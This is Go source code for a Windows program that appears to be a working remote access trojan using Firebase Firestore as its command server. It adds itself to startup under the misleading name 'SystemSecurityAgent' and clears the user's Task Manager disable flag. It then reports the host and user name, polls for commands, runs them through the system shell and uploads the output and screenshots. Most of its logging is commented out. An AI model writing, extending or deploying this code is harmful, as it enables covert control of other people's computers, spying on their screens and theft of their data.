package main

import (
	"bytes"
	"context"
	_ "embed"
	"encoding/base64"
	"fmt"
	"image/jpeg"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"cloud.google.com/go/firestore"
	firebase "firebase.google.com/go/v4"
	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows/registry"
	"google.golang.org/api/option"
)

const (
	pollInterval = 10 * time.Second
	cmdTimeout   = 60 * time.Second
	logFileName  = "agent.log"
)

var activeCollection string

//go:embed serviceAccountKey.json
var credBytes []byte

var (
	kernel32        = syscall.NewLazyDLL("kernel32.dll")
	procCreateMutex = kernel32.NewProc("CreateMutexW")
)

func main() {
	defer func() {
		if r := recover(); r != nil {
			// log.Printf("💥 FATAL PANIC: %v", r)
		}
	}()

	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)
	_ = os.Chdir(exeDir)

	setupLogging()
	// log.Println("🚀 Starting Agent...")

	preventMultipleInstances()
	// log.Println("🔒 Single-instance check passed.")

	setupStartup(exePath)
	// log.Println("📁 Registry startup check complete.")

	if len(credBytes) < 100 {
		log.Fatalf("❌ FATAL: serviceAccountKey.json was NOT embedded properly! Re-build the exe.")
	}
	// log.Println("🔑 Embedded credentials found.")

	// --- DYNAMIC COLLECTION NAME GENERATION ---
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "UnknownPC"
	}
	username := os.Getenv("USERNAME")
	if username == "" {
		username = "User"
	}

	safeHost := strings.ReplaceAll(strings.ToLower(hostname), " ", "_")
	safeUser := strings.ReplaceAll(strings.ToLower(username), " ", "_")
	activeCollection = fmt.Sprintf("commands_%s_%s", safeHost, safeUser)

	// log.Printf("📦 Dynamic Collection Name: %s", activeCollection)
	// ------------------------------------------

	ctx := context.Background()
	var fsClient *firestore.Client

	// log.Println("🌐 Connecting to Firebase...")
	for i := 0; i < 10; i++ {
		creds := option.WithCredentialsJSON(credBytes)
		var app *firebase.App
		app, err = firebase.NewApp(ctx, nil, creds)
		if err == nil {
			timeoutCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
			fsClient, err = app.Firestore(timeoutCtx)
			cancel()

			if err == nil {
				timeoutCtx2, cancel2 := context.WithTimeout(ctx, 10*time.Second)
				_, pingErr := fsClient.Collection("ping").Doc("ping").Get(timeoutCtx2)
				cancel2()

				if pingErr == nil || pingErr.Error() != "context deadline exceeded" {
					break
				}
				err = fmt.Errorf("network timeout - blocked by firewall")
			}
		}
		// log.Printf("⏳ Connection failed (Attempt %d/10): %v. Retrying in 15 seconds...", i+1, err)
		time.Sleep(15 * time.Second)
	}

	if fsClient == nil {
		log.Fatalf("❌ Failed to connect to Firebase after retries: %v", err)
	}
	// log.Println("✅ Connected to Firebase successfully!")

	// --- NEW: Create the collection in Firebase immediately ---
	registerAgent(ctx, fsClient, hostname, username)
	// ---------------------------------------------------------

	// log.Printf("👀 Watching collection '%s' every %s", activeCollection, pollInterval)

	runCycle(ctx, fsClient)
	ticker := time.NewTicker(pollInterval)
	defer ticker.Stop()

	for {
		<-ticker.C
		runCycle(ctx, fsClient)
	}
}

// registerAgent writes a document so the collection appears in the Firebase Console
func registerAgent(ctx context.Context, client *firestore.Client, hostname, username string) {
	_, err := client.Collection(activeCollection).Doc("_agent_info").Set(ctx, map[string]interface{}{
		"hostname":  hostname,
		"username":  username,
		"status":    "online",
		"last_seen": time.Now().UTC().Format(time.RFC3339),
	})
	if err != nil {
		// log.Printf("⚠️ Failed to initialize collection in Firebase: %v", err)
	} else {
		// log.Println("✅ Successfully initialized collection in Firebase (Check your database!)")
	}
}

func setupStartup(exePath string) {
	if runtime.GOOS != "windows" {
		return
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		// log.Printf("⚠️ Failed to open Run registry key: %v", err)
		return
	}
	defer k.Close()

	targetValue := `"` + exePath + `"`
	currentVal, _, _ := k.GetStringValue("SystemSecurityAgent")
	if currentVal != targetValue {
		err = k.SetStringValue("SystemSecurityAgent", targetValue)
		if err != nil {
			// log.Printf("⚠️ Failed to write to registry: %v", err)
		} else {
			// log.Println("✅ Successfully registered in Windows Startup")
		}
	} else {
		// log.Println("✅ Already registered in Windows Startup")
	}

	approvedKey, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run`, registry.SET_VALUE)
	if err == nil {
		err = approvedKey.DeleteValue("SystemSecurityAgent")
		if err == nil {
			// log.Println("✅ Removed Task Manager disable flag")
		}
		approvedKey.Close()
	}
}

func runCycle(ctx context.Context, client *firestore.Client) {
	iter := client.Collection(activeCollection).Where("pending", "==", true).Documents(ctx)
	defer iter.Stop()

	for {
		doc, err := iter.Next()
		if err != nil {
			break
		}

		data := doc.Data()
		cmdStr, _ := data["cmd"].(string)
		if cmdStr == "" {
			continue
		}

		// log.Printf("▶️  [%s] Running: %s", doc.Ref.ID, cmdStr)
		var result string

		if cmdStr == "screenshot" || cmdStr == "!screenshot" {
			// log.Println("📸 Taking screenshot...")
			base64Img, err := takeScreenshot()
			if err != nil {
				result = fmt.Sprintf("[error] failed to take screenshot: %v", err)
			} else {
				result = "data:image/jpeg;base64," + base64Img
			}
		} else {
			var runErr error
			result, runErr = runShell(cmdStr)
			if runErr != nil {
				result = fmt.Sprintf("[error] %v\n%s", runErr, result)
			}
		}

		_, err = doc.Ref.Update(ctx, []firestore.Update{
			{Path: "pending", Value: false},
			{Path: "results", Value: result},
		})
		if err != nil {
			// log.Printf("⚠️  Failed to save result for %s: %v", doc.Ref.ID, err)
		} else {
			// log.Printf("✅ Saved result for %s", doc.Ref.ID)
		}
	}
}

func runShell(cmdStr string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
	defer cancel()

	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.CommandContext(ctx, "cmd", "/C", cmdStr)
	} else {
		c = exec.CommandContext(ctx, "sh", "-c", cmdStr)
	}
	out, err := c.CombinedOutput()
	return string(out), err
}

func takeScreenshot() (string, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "", fmt.Errorf("no active displays found")
	}
	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		return "", err
	}
	var buf bytes.Buffer
	err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: 30})
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
}

func setupLogging() {
	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)
	logPath := filepath.Join(exeDir, logFileName)

	f, err := os.OpenFile(logPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)
	if err != nil {
		tempDir := os.TempDir()
		logPath := filepath.Join(tempDir, logFileName)
		f, err = os.OpenFile(logPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)
		if err != nil {
			os.Exit(1)
		}
		notePath := filepath.Join(exeDir, "WHERE_IS_THE_LOG.txt")
		_ = os.WriteFile(notePath, []byte("Log file is located here:\n"+logPath), 0644)
	}

	log.SetOutput(f)
	// log.Println("--- Agent Started ---")
}

func preventMultipleInstances() {
	if runtime.GOOS != "windows" {
		return
	}
	name, _ := syscall.UTF16PtrFromString("Local\\MyFirebaseAgentMutex")
	h, _, err := procCreateMutex.Call(0, 0, uintptr(unsafe.Pointer(name)))

	if h == 0 {
		log.Printf("⚠️ Mutex creation failed: %v", err)
		return
	}

	if syscall.GetLastError() == syscall.Errno(183) {
		// log.Println("⚠️ Another instance is already running! Exiting this one.")
		os.Exit(0)
	}
}
